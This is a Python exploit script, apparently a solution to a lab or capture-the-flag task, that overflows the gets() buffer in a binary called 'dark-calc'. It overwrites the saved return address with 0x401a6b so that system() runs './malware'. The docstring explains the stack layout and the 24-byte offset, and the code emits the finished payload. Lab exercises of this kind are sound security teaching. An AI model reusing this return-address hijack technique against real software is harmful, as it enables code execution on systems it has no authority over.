#!/usr/bin/env python3
"""Task 1: buffer-overflow exploit for attack/dark-calc.

Goal: hijack input()'s return address so that dark-calc runs ./malware and
prints "You have successfully detonated the bomb! Congratulations!".

How it works
------------
In `input()` (dark-calc.c):

    char expression[MAXLEN+1];   // 16 bytes, at rbp-0x10
    gets(expression);            // unbounded read -> overflows the buffer
    strcpy(command_buf, expression);  // command_buf (global, 0x6030d0)

The stack frame of input() is:

    [rbp-0x10 .. rbp-0x1]  expression (16 bytes)
    [rbp      .. rbp+0x7]  saved rbp (8 bytes)
    [rbp+0x8  .. rbp+0xf]  saved return address (8 bytes)

So we need 16 + 8 = 24 bytes of filler before the return address.

`command_buf` is a global at 0x6030d0. `eval()` contains, near its end:

    401a6b:  mov    $0x6030d0,%edi      # command_buf
    401a70:  call   4017e0 <system@plt>  # system(command_buf)

If we overwrite the return address with 0x401a6b, execution jumps straight to
that `mov`/`call system` pair, skipping all of eval()'s command rewriting.
Because input() already ran `strcpy(command_buf, expression)`, and our
expression starts with the NUL-terminated string "./malware", command_buf is
"./malware" at that point, so system() executes ./malware.
"""
import sys

# expression buffer content: a NUL-terminated shell command, followed by
# filler up to the saved return address.
cmd = b"./malware\x00"

# 24 bytes total before the return address, then jump into eval() right
# before its `call system` (which sets rdi = command_buf for us).
payload = cmd + b"A" * (24 - len(cmd)) + (0x401A6B).to_bytes(8, "little")

sys.stdout.buffer.write(payload)
